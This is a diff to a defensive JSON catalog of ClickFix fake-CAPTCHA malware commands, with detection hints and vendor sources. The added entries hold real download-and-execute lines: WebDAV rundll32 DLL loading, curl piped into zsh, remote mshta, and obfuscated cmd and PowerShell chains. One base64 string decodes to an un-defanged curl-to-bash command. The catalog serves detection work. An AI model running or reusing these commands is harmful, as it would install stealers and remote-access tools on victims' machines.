@@ -3,7 +3,7 @@
     "title": "ClickFix Command Catalog",
     "purpose": "Defensive threat-intel reference of ClickFix (fake-CAPTCHA / paste-and-run) command patterns for detection engineering and threat hunting.",
     "warning": "All commands are DEFANGED malicious samples for DETECTION ONLY. Do not execute. URLs neutralised (hxxp, [.]).",
-    "updated": "2026-09-17"
+    "updated": "2026-09-22"
   },
   "entries": [
     {
@@ -355,6 +355,76 @@
       "source": "Huntress",
       "source_url": "https://www.huntress.com/blog/mac-crypto-draining-malware",
       "date_added": "2026-08-06"
+    },
+    {
+      "id": "cf-0036",
+      "command": "pushd \\\\leaguejazire[.]com\\<randomized_subdomain>\\<victim_identifier> && rundll32 pf.ch moor && popd",
+      "executor": "cmd.exe (Run dialog) -> rundll32.exe",
+      "technique": "ClearFake fake Google CAPTCHA; pushd maps a WebDAV share, then rundll32 loads a DLL disguised as 'pf.ch' by ordinal; leads to Amatera stealer, ZigCryptoStealer and NetSupport Manager",
+      "detection": "Look for explorer.exe starting cmd.exe with 'pushd \\\\' and rundll32 loading a DLL with an odd extension (.ch/.ct/.google) from a DavWWWRoot/WebClient path in the same line; check RunMRU",
+      "source": "Cisco Talos",
+      "source_url": "https://blog.talosintelligence.com/clearfake-webdav-infection-chain/",
+      "date_added": "2026-09-08"
+    },
+    {
+      "id": "cf-0037",
+      "command": "export STATE_lim=v3.16.6 export _watch_ix=c8ae6d2b curl -fsS \"hxxps://ember-bridge[.]com/curl/quohwuhu5o2/setup.sh\" | zsh",
+      "executor": "zsh (macOS Terminal)",
+      "technique": "PasteSwitch: hijacked HBO Max Reddit ads led to a fake Alfred app page; decoy env-var exports are followed by curl piped into zsh, which delivers MacSync/AMOS",
+      "detection": "Look for Terminal/zsh sessions running curl -fsS against a '/curl/<id>/setup.sh' path piped into zsh, especially after throwaway 'export' lines; flag ember-bridge/weaveridge7 domains",
+      "source": "adamnet.works (PasteSwitch research)",
+      "source_url": "https://adamnet.works/blog/hbo-max-ads-exposed-the-pasteswitch-clickfix-operation/",
+      "date_added": "2026-09-13"
+    },
+    {
+      "id": "cf-0038",
+      "command": "mshta hxxps://desktop-version[.]com/app",
+      "executor": "mshta.exe",
+      "technique": "PasteSwitch Windows branch: a fake Claude desktop lure on cladesktop.gitlab.io runs a remote HTA via mshta, which stages Amatera stealer",
+      "detection": "Look for explorer.exe spawning mshta.exe with an extensionless HTTPS URL path such as '/app'; hunt for desktop-version[.]com and oakenfjrod[.]ru, and the Amatera C2 at 77.91.65[.]13:443",
+      "source": "adamnet.works (PasteSwitch research)",
+      "source_url": "https://adamnet.works/blog/hbo-max-ads-exposed-the-pasteswitch-clickfix-operation/",
+      "date_added": "2026-09-13"
+    },
+    {
+      "id": "cf-0039",
+      "command": "bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9ibGFjay1mZWF0aGVyLTljZmQuYWRyaWFucm95LTAxLndvcmtlcnMuZGV2JyB8IGJhc2g=\" | base64 -d)",
+      "executor": "bash (macOS Terminal)",
+      "technique": "A here-string feeds a base64-decoded 'curl -s hxxps://black-feather-9cfd.adrianroy-01.workers[.]dev | bash' into bash; the crimekit rotates C2 domains through a Polygon contract (EtherHiding)",
+      "detection": "Look for bash/zsh command lines with '<<<' plus 'base64 -d', and for curl calls to *.workers.dev from a Terminal whose parent is a browser session",
+      "source": "NetbyteSEC",
+      "source_url": "https://notes.netbytesec.com/2026/08/anatomy-of-macos-clickfix-crimekit-that.html",
+      "date_added": "2026-08-20"
+    },
+    {
+      "id": "cf-0040",
+      "command": "\"powershell\" -c \"$s=([wmiclass]'Win32_ProcessStartup').CreateInstance();$s.ShowWindow=0;([wmiclass]'Win32_Process').Create('cmd /v/c pushd \\\\vqrlwsmzu[.]webyek[.]com@SSL\\<GUID> & rundll32 gc.key,#1'",
+      "executor": "powershell.exe -> WMI (WmiPrvSE.exe) -> cmd.exe -> rundll32.exe",
+      "technique": "PowerShell starts a hidden cmd through WMI Win32_Process.Create, which breaks the explorer->cmd parent chain; cmd then mounts a WebDAV share over SSL and runs a DLL named 'gc.key' by ordinal #1",
+      "detection": "Look for WmiPrvSE.exe spawning cmd.exe that contains 'pushd \\\\' and '@SSL', and for PowerShell lines containing \"[wmiclass]'Win32_Process'\" together with ShowWindow=0",
+      "source": "CyberProof",
+      "source_url": "https://www.cyberproof.com/blog/clickfix-keeps-evolving-rundll32-ordinal-execution-over-webdav/",
+      "date_added": "2026-07-28"
+    },
+    {
+      "id": "cf-0041",
+      "command": "pcalua.exe -a \"PowerShell\" -c \"saps cmd '/v/c pu^shd \\\\uttepcheweaxtowxdj.gentletouchchiropracticclinicauroracol[.]com@SSL\\<GUID> && ru^ndll32 j.pm,#1'\"",
+      "executor": "pcalua.exe -> powershell.exe -> cmd.exe -> rundll32.exe",
+      "technique": "Program Compatibility Assistant proxies PowerShell, which uses Start-Process (saps) to launch cmd; carets split 'pushd' and 'rundll32', and a DLL disguised as 'j.pm' runs from WebDAV by ordinal",
+      "detection": "Look for pcalua.exe with '-a PowerShell', and for cmd lines containing caret-split 'pu^shd' or 'ru^ndll32' plus '@SSL\\'",
+      "source": "CyberProof",
+      "source_url": "https://www.cyberproof.com/blog/clickfix-keeps-evolving-rundll32-ordinal-execution-over-webdav/",
+      "date_added": "2026-07-28"
+    },
+    {
+      "id": "cf-0042",
+      "command": "cmd /v:on /c \"set a=pu&set b=shd&set c=run&set d=dll32&for %x in (!a!!b!) do @%x hcwjcope.poundbahis[.]com@SSL@443\\<GUID> & !c!!d! goog.ct,#1\"",
+      "executor": "cmd.exe",
+      "technique": "Delayed-expansion variables rebuild 'pushd' and 'rundll32', and a for-loop runs the pushd to a WebDAV share over SSL on port 443; rundll32 then loads 'goog.ct' by ordinal #1",
+      "detection": "Look for cmd.exe with '/v:on', short 'set' fragments like 'pu'/'shd'/'dll32', a 'for %x in (!' construct, and '@SSL@443' in one command line",
+      "source": "CyberProof",
+      "source_url": "https://www.cyberproof.com/blog/clickfix-keeps-evolving-rundll32-ordinal-execution-over-webdav/",
+      "date_added": "2026-07-28"
     }
   ]
 }
